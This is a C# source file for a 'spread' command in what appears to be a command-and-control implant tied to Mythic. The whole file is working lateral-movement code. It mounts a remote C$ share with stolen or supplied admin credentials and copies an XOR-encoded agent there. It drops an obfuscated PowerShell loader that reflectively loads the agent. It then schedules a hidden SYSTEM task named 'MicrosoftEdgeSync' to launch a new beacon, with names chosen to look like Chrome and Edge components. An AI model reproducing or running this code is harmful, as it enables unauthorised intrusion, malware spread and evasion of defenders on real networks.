using System;
using System.Diagnostics;
using System.IO;

namespace Chimera.Commands
{
    // spread <target_ip> <username> <password>
    //
    // Manual lateral movement. Operator supplies all credentials.
    // Steps:
    //   1. net use \\<target>\C$ with supplied credentials
    //   2. xcopy agent.dat + a PS loader script to \\<target>\C$\Users\Public\Chrome\
    //   3. schtasks /create on the remote box pointing at the PS loader
    //   4. net use /delete to clean up the share
    //
    // Requires:
    //   - admin credentials on the target
    //   - agent.dat already on disk (run 'persist' first)
    //   - SMB/ADMIN$ reachable on target (port 445)
    //
    // The scheduled task runs within ~60 s; watch Mythic for the new beacon.
    public static class Spread
    {
        private const string TaskName = "MicrosoftEdgeSync";

        public static string Execute(string parameters)
        {
            if (string.IsNullOrEmpty(parameters))
                return "[usage] spread <target_ip> <username> <password>";

            string[] parts = parameters.Trim().Split(new char[]{' '}, 3,
                StringSplitOptions.RemoveEmptyEntries);
            if (parts.Length < 3)
                return "[usage] spread <target_ip> <username> <password>";

            string targetIP = parts[0];
            string username = parts[1];
            string password = parts[2];
            string share    = @"\\" + targetIP + @"\C$";
            string remDir   = share + @"\Users\Public\Chrome";
            string blobPath = Path.Combine(Staging.Dir, "agent.dat");

            var sb = new System.Text.StringBuilder();
            sb.AppendLine("[*] Target: " + targetIP);

            if (!File.Exists(blobPath))
                return "[error] " + blobPath + " not found. Run 'persist' first.";

            // ----------------------------------------------------------------
            // 1. Map share
            // ----------------------------------------------------------------
            sb.AppendLine("[*] Mapping " + share + " ...");
            string mapOut = RunCmd("net use " + share +
                " /user:" + username + " " + password);
            if (mapOut.IndexOf("error", StringComparison.OrdinalIgnoreCase) >= 0 ||
                mapOut.IndexOf("failed", StringComparison.OrdinalIgnoreCase) >= 0)
            {
                sb.AppendLine("[-] net use failed: " + mapOut.Trim());
                return sb.ToString();
            }
            sb.AppendLine("[+] Share mapped.");

            try
            {
                // ----------------------------------------------------------------
                // 2. Create remote staging directory and copy files
                // ----------------------------------------------------------------
                if (!Directory.Exists(remDir))
                {
                    Directory.CreateDirectory(remDir);
                    sb.AppendLine("[+] Created " + remDir);
                }

                // Copy agent blob
                string remBlob = remDir + @"\agent.dat";
                File.Copy(blobPath, remBlob, overwrite: true);
                sb.AppendLine("[+] Copied agent.dat -> " + remBlob);

                // Write tiny PS loader script alongside the blob
                string remScript = remDir + @"\updater.ps1";
                string loaderScript =
                    "$k=0x41;" +
                    "$d=[IO.File]::ReadAllBytes('C:\\Users\\Public\\Chrome\\agent.dat');" +
                    "$o=New-Object byte[] $d.Length;" +
                    "for($i=0;$i -lt $d.Length;$i++){$o[$i]=$d[$i]-bxor$k};" +
                    "[Reflection.Assembly]::Load($o).EntryPoint.Invoke($null,@())";
                File.WriteAllText(remScript, loaderScript);
                sb.AppendLine("[+] Wrote loader script -> " + remScript);

                // ----------------------------------------------------------------
                // 3. Create remote scheduled task (fires once in ~30 s)
                // ----------------------------------------------------------------
                // Delete stale task silently first
                RunCmd("schtasks /s " + targetIP +
                    " /u " + username + " /p " + password +
                    " /delete /tn " + TaskName + " /f");

                string taskCmd =
                    "schtasks /create" +
                    " /s " + targetIP +
                    " /u " + username +
                    " /p " + password +
                    " /tn " + TaskName +
                    " /sc ONCE" +
                    " /st " + DateTime.Now.AddSeconds(30).ToString("HH:mm") +
                    @" /tr ""powershell.exe -ep bypass -WindowStyle Hidden -File 'C:\Users\Public\Chrome\updater.ps1'""" +
                    " /ru SYSTEM" +
                    " /f";

                string taskOut = RunCmd(taskCmd);
                if (taskOut.IndexOf("SUCCESS", StringComparison.OrdinalIgnoreCase) >= 0 ||
                    taskOut.IndexOf("created", StringComparison.OrdinalIgnoreCase) >= 0)
                    sb.AppendLine("[+] Scheduled task '" + TaskName + "' created on " + targetIP);
                else
                    sb.AppendLine("[-] schtasks output: " + taskOut.Trim());
            }
            catch (Exception ex)
            {
                sb.AppendLine("[error] " + ex.Message);
            }
            finally
            {
                // ----------------------------------------------------------------
                // 4. Unmap share (always runs)
                // ----------------------------------------------------------------
                RunCmd("net use " + share + " /delete /y");
                sb.AppendLine("[+] Share " + share + " disconnected.");
            }

            sb.AppendLine("[*] Watch Mythic for a new beacon from " + targetIP + " (~30-60 s).");
            return sb.ToString();
        }

        private static string RunCmd(string cmd)
        {
            var psi = new ProcessStartInfo("cmd.exe", "/c " + cmd)
            {
                UseShellExecute        = false,
                RedirectStandardOutput = true,
                RedirectStandardError  = true,
                CreateNoWindow         = true
            };
            using (Process p = Process.Start(psi))
            {
                string o = p.StandardOutput.ReadToEnd();
                string e = p.StandardError.ReadToEnd();
                p.WaitForExit(15000);
                return o + e;
            }
        }
    }
}
